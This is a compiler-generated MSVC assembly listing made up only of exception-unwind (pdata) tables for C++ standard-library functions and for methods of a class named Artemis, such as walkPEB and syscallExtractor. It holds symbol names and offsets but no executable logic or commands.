pdata	SEGMENT
$pdata$??1?$_Yarn@_W@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1?$_Yarn@_W@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$_Yarn@_W@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+50
	DD	imagerel $unwind$?_Tidy@?$_Yarn@_W@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??Bid@locale@std@@QEAA_KXZ DD imagerel $LN6
	DD	imagerel $LN6+95
	DD	imagerel $unwind$??Bid@locale@std@@QEAA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0facet@locale@std@@IEAA@_K@Z DD imagerel $LN4
	DD	imagerel $LN4+61
	DD	imagerel $unwind$??0facet@locale@std@@IEAA@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1facet@locale@std@@MEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$??1facet@locale@std@@MEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gfacet@locale@std@@MEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gfacet@locale@std@@MEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0locale@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$??0locale@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1locale@std@@QEAA@XZ DD imagerel $LN6
	DD	imagerel $LN6+99
	DD	imagerel $unwind$??1locale@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?c_str@locale@std@@QEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+71
	DD	imagerel $unwind$?c_str@locale@std@@QEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z DD imagerel $LN8
	DD	imagerel $LN8+167
	DD	imagerel $unwind$?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0ctype_base@std@@QEAA@_K@Z DD imagerel $LN4
	DD	imagerel $LN4+54
	DD	imagerel $unwind$??0ctype_base@std@@QEAA@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1ctype_base@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$??1ctype_base@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gctype_base@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gctype_base@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?widen@?$ctype@D@std@@QEBADD@Z DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$?widen@?$ctype@D@std@@QEBADD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z DD imagerel $LN3
	DD	imagerel $LN3+60
	DD	imagerel $unwind$?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z DD imagerel $LN4
	DD	imagerel $LN4+76
	DD	imagerel $unwind$??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA DD imagerel ?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD imagerel $LN10
	DD	imagerel $LN10+232
	DD	imagerel $unwind$?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+29
	DD	imagerel $unwind$?dtor$0@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+38
	DD	imagerel $unwind$?dtor$1@?0??_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$ctype@D@std@@MEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$??1?$ctype@D@std@@MEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+57
	DD	imagerel $unwind$?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$ctype@D@std@@IEAAXXZ DD imagerel $LN6
	DD	imagerel $LN6+90
	DD	imagerel $unwind$?_Tidy@?$ctype@D@std@@IEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_tolower@?$ctype@D@std@@MEBADD@Z DD imagerel $LN3
	DD	imagerel $LN3+40
	DD	imagerel $unwind$?do_tolower@?$ctype@D@std@@MEBADD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z DD imagerel $LN6
	DD	imagerel $LN6+105
	DD	imagerel $unwind$?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_toupper@?$ctype@D@std@@MEBADD@Z DD imagerel $LN3
	DD	imagerel $LN3+40
	DD	imagerel $unwind$?do_toupper@?$ctype@D@std@@MEBADD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z DD imagerel $LN6
	DD	imagerel $LN6+105
	DD	imagerel $unwind$?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z DD imagerel $LN3
	DD	imagerel $LN3+83
	DD	imagerel $unwind$?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z DD imagerel $LN3
	DD	imagerel $LN3+83
	DD	imagerel $unwind$?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G?$ctype@D@std@@MEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_G?$ctype@D@std@@MEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z DD imagerel $LN11
	DD	imagerel $LN11+257
	DD	imagerel $unwind$??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0???$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?is@?$ctype@_W@std@@QEBA_NF_W@Z DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?is@?$ctype@_W@std@@QEBA_NF_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?widen@?$ctype@_W@std@@QEBA_WD@Z DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$?widen@?$ctype@_W@std@@QEBA_WD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z DD imagerel $LN4
	DD	imagerel $LN4+76
	DD	imagerel $unwind$??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA DD imagerel ?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD imagerel $LN10
	DD	imagerel $LN10+232
	DD	imagerel $unwind$?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+29
	DD	imagerel $unwind$?dtor$0@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+38
	DD	imagerel $unwind$?dtor$1@?0??_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$ctype@_W@std@@MEAA@XZ DD imagerel $LN4
	DD	imagerel $LN4+78
	DD	imagerel $unwind$??1?$ctype@_W@std@@MEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+137
	DD	imagerel $unwind$?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_is@?$ctype@_W@std@@MEBA_NF_W@Z DD imagerel $LN5
	DD	imagerel $LN5+82
	DD	imagerel $unwind$?do_is@?$ctype@_W@std@@MEBA_NF_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z DD imagerel $LN5
	DD	imagerel $LN5+108
	DD	imagerel $unwind$?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z DD imagerel $LN5
	DD	imagerel $LN5+108
	DD	imagerel $unwind$?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z DD imagerel $LN6
	DD	imagerel $LN6+107
	DD	imagerel $unwind$?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z DD imagerel $LN6
	DD	imagerel $LN6+107
	DD	imagerel $unwind$?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z DD imagerel $LN5
	DD	imagerel $LN5+108
	DD	imagerel $unwind$?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_widen@?$ctype@_W@std@@MEBA_WD@Z DD imagerel $LN3
	DD	imagerel $LN3+33
	DD	imagerel $unwind$?do_widen@?$ctype@_W@std@@MEBA_WD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z DD imagerel $LN6
	DD	imagerel $LN6+118
	DD	imagerel $unwind$?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z DD imagerel $LN5
	DD	imagerel $LN5+142
	DD	imagerel $unwind$?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z DD imagerel $LN3
	DD	imagerel $LN3+45
	DD	imagerel $unwind$?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z DD imagerel $LN6
	DD	imagerel $LN6+123
	DD	imagerel $unwind$?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G?$ctype@_W@std@@MEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_G?$ctype@_W@std@@MEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z DD imagerel $LN4
	DD	imagerel $LN4+88
	DD	imagerel $unwind$??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1failure@ios_base@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1failure@ios_base@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0failure@ios_base@std@@QEAA@AEBV012@@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$??0failure@ios_base@std@@QEAA@AEBV012@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gfailure@ios_base@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gfailure@ios_base@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?clear@ios_base@std@@QEAAXH_N@Z DD imagerel $LN9
	DD	imagerel $LN9+228
	DD	imagerel $unwind$?clear@ios_base@std@@QEAAXH_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?good@ios_base@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+51
	DD	imagerel $unwind$?good@ios_base@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?setf@ios_base@std@@QEAAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+78
	DD	imagerel $unwind$?setf@ios_base@std@@QEAAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?width@ios_base@std@@QEAA_J_J@Z DD imagerel $LN3
	DD	imagerel $LN3+50
	DD	imagerel $unwind$?width@ios_base@std@@QEAA_J_J@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?getloc@ios_base@std@@QEBA?AVlocale@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+62
	DD	imagerel $unwind$?getloc@ios_base@std@@QEBA?AVlocale@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?hex@std@@YAAEAVios_base@1@AEAV21@@Z DD imagerel $LN3
	DD	imagerel $LN3+40
	DD	imagerel $unwind$?hex@std@@YAAEAVios_base@1@AEAV21@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+36
	DD	imagerel $unwind$??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+31
	DD	imagerel $unwind$??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN9
	DD	imagerel $LN9+547
	DD	imagerel $unwind$?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA DD imagerel ?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA
	DD	imagerel ?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN13
	DD	imagerel $LN13+847
	DD	imagerel $unwind$?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+24
	DD	imagerel $unwind$?dtor$2@?0??walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?syscallExtractor@Artemis@@QEAAH_K@Z DD imagerel $LN8
	DD	imagerel $LN8+276
	DD	imagerel $unwind$?syscallExtractor@Artemis@@QEAAH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA DD imagerel ?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA
	DD	imagerel ?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z DD imagerel $LN9
	DD	imagerel $LN9+302
	DD	imagerel $unwind$?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA DD imagerel ?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA
	DD	imagerel ?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN7
	DD	imagerel $LN7+225
	DD	imagerel $unwind$?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA DD imagerel ?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
	DD	imagerel ?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA+27
	DD	imagerel $unwind$?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0Artemis@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$??0Artemis@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1Artemis@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+31
	DD	imagerel $unwind$??1Artemis@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z DD imagerel $LN5
	DD	imagerel $LN5+83
	DD	imagerel $unwind$?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z DD imagerel $LN3
	DD	imagerel $LN3+55
	DD	imagerel $unwind$?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
